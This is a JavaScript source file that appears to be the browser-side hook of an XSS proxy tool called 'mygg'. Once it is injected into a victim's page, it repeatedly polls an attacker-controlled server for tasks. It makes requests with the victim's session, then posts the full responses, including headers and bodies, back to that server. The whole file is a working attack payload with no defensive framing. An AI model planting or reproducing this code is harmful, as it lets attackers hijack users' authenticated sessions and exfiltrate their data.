function makeRequest(id, method, url, head, body) {
    /* Forcing the hooked browser to perform the request. */
    var target_http = new XMLHttpRequest();
    target_http.responseType = 'blob';
    target_http.onreadystatechange = function() {

        /* Sending the response back to mygg. */
        if (target_http.readyState == 4) {
            var formData = new FormData();
            formData.append('id', id);
            formData.append('method', method);
            formData.append('url', url);

            /* Ugly hack for old browser's that doesn't support responseURL */
            responseURL = (target_http.responseURL? target_http.responseURL : url);

            /* Checking if the browser got a redirect. */
            if (stripProt(url) == stripProt(responseURL)) {
                formData.append('status', target_http.status);
                formData.append('headers', target_http.getAllResponseHeaders());
                var blob = new Blob([target_http.response], {type: 'application/octet-stream'});
                formData.append('body', blob);
            } else {
                /* Need to redirect the attacking browser too. */
                formData.append('status', '301');
                formData.append('headers', "Location: " + target_http.responseURL);
            }
            var mygg_http = new XMLHttpRequest();
            mygg_http.open("POST", "//${config.domain}:" + getPort() + "/responses", true);
            mygg_http.send(formData);
        }
    };
    
    target_http.open(method, url, true);
    //for (var key in head) { target_http.setRequestHeader(key, head[key]) }
    if (body) {
        // Need to add some headers sent from the attacking browser
        target_http.setRequestHeader('content-type', head['content-type']);
        target_http.send(body.trim());
    } else {
        target_http.send();
    }
}

function stripProt(url) {
    return url.split('://').splice(1).join('/');
}

function getPath(url) {
    return '/' + url.split('/').splice(3).join('/');
}

function getPort() {
    var ports = {'http': 80, 'https': 8443};
    return ports[location.protocol.slice(0, -1)];
}

function poll() {
    var mygg_http = new XMLHttpRequest();
    mygg_http.onreadystatechange = function () {
        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
            var tasks = JSON.parse(mygg_http.responseText);
            for (var i in tasks){
                console.log("New task"); console.log(tasks[i]);
                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].headers, tasks[i].body);
            }
        }
    };
    mygg_http.open("GET", "//${config.domain}:" + getPort() + "/polling", true);
    mygg_http.send();
    setTimeout(poll, ${config.polling_time});
}
poll();
